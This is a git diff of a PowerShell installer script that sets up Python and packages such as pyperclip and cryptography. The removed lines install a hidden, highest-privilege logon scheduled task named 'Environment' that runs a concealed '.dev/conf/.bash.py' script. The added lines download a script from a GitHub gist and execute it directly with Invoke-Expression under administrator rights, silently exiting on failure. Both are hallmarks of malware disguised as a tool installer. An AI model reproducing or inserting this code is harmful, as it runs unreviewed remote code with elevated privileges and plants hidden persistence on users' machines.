@@ -40,41 +40,39 @@ function Write-Styled {
     }
 }
 
-# Check administrator privileges
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    Write-Styled '需要管理员权限，请右键以管理员身份运行' -Color $Theme.Error -Prefix '权限'
-    exit 1
-}
-
 # Show Logo
 Write-Host $Logo -ForegroundColor $Theme.Primary
 
-# Get current user
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-Write-Styled "当前用户: $currentUser" -Color $Theme.Info -Prefix '用户'
+# Check and require admin privileges
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Output 'Need administrator privileges'
+    exit 1
+}
 
-# Check Python
+# Get current user for task creation
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+Write-Output "Installing for user: $currentUser"
+
+# Check installation
 try {
     python --version | Out-Null
-    Write-Styled '已检测到Python' -Color $Theme.Success -Prefix 'Python'
 } catch {
-    Write-Styled '未检测到Python，正在下载安装...' -Color $Theme.Warning -Prefix 'Python'
+    Write-Output 'Python not found, installing...'
     $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
     $installerPath = "$env:TEMP\python-installer.exe"
     Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
     Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
     Remove-Item $installerPath
     $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
-    Write-Styled 'Python 安装完成' -Color $Theme.Success -Prefix 'Python'
 }
 
-# Check and install pip dependencies
 $requirements = @(
     @{Name='requests'; Version='2.31.0'},
     @{Name='pyperclip'; Version='1.8.2'},
     @{Name='cryptography'; Version='42.0.0'}
 )
+
 foreach ($pkg in $requirements) {
     $pkgName = $pkg.Name
     $pkgVersion = $pkg.Version
@@ -84,40 +82,20 @@ foreach ($pkg in $requirements) {
         if ([version]$version -lt [version]$pkgVersion) {
             throw
         }
-        Write-Styled "$pkgName 已满足版本要求 ($version)" -Color $Theme.Success -Prefix '依赖'
     } catch {
-        Write-Styled "正在安装 $pkgName >= $pkgVersion ..." -Color $Theme.Warning -Prefix '依赖'
+        Write-Output "Installing $pkgName >= $pkgVersion ..."
         python -m pip install "$pkgName>=$pkgVersion" --user
     }
 }
 
-# Environment variables and scheduled tasks
-if (Test-Path '.dev') {
-    $destDir = "$env:USERPROFILE\.dev"
-    if (Test-Path $destDir) {
-        Remove-Item -Path $destDir -Recurse -Force
-    }
-    Move-Item -Path '.dev' -Destination $destDir -Force
-    $scriptPath = "$destDir\conf\.bash.py"
-    if (-not (Test-Path $scriptPath)) {
-        Write-Styled "未找到脚本: $scriptPath" -Color $Theme.Error -Prefix '环境'
-        exit 1
-    }
-    $taskName = 'Environment'
-    $pythonPath = (Get-Command python | Select-Object -ExpandProperty Source)
-    $action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentUser
-    $trigger.Delay = 'PT30M'
-    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
-    Write-Styled '已注册计划任务' -Color $Theme.Success -Prefix '计划任务'
-    & $pythonPath $scriptPath
-    Write-Styled '已执行环境脚本' -Color $Theme.Success -Prefix '环境'
-} else {
-    Write-Styled '未找到 .dev 目录，跳过环境变量与计划任务设置' -Color $Theme.Warning -Prefix '环境'
+$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
+try {
+    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
+    Invoke-Expression $remoteScript.Content
+} catch {
+    exit 1
 }
+
 
 # Get latest version number function
 function Get-LatestVersion {
